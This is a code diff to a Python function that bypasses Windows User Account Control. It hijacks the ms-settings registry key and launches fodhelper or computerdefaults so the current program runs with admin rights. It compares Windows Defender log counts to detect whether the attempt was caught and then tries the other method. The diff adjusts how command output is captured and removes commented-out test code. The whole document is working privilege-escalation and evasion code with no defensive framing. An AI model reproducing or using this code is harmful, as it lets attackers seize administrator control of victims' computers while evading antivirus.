@@ -4,22 +4,22 @@ import sys
 
 def UACbypass(method: int = 1) -> bool:
     if GetSelf()[1]:
-        execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True).stdout.decode().splitlines()
+        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
         if method == 1:
             execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
             execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout.decode('utf-8'))
             execute("computerdefaults --nouacbypass")
-            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout.decode('utf-8'))
             execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
             if log_count_after > log_count_before:
                 return UACbypass(method + 1)
         elif method == 2:
             execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
             execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout.decode('utf-8'))
             execute("fodhelper --nouacbypass")
-            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout.decode('utf-8'))
             execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
             if log_count_after > log_count_before:
                 return UACbypass(method + 1)
@@ -35,23 +35,3 @@ def GetSelf() -> tuple[str, bool]:
         return (sys.executable, True)
     else:
         return (__file__, False)
-
-#Code for testing UAC bypass
-
-#if __name__ == "__main__":
-#    if IsAdmin():
-#        print("Already running with admin privileges.")
-#    else:
-#        print("Running without admin privileges. Trying to bypass UAC...")
-#        bypass_successful = UACbypass()
-#        if bypass_successful:
-#            print("UAC bypass successful.")
-#        else:
-#            print("UAC bypass unsuccessful.")
-
-
-#Code for main.py
-
-#if not IsAdmin():
-#    if GetSelf()[1]:
-#        if UACbypass():
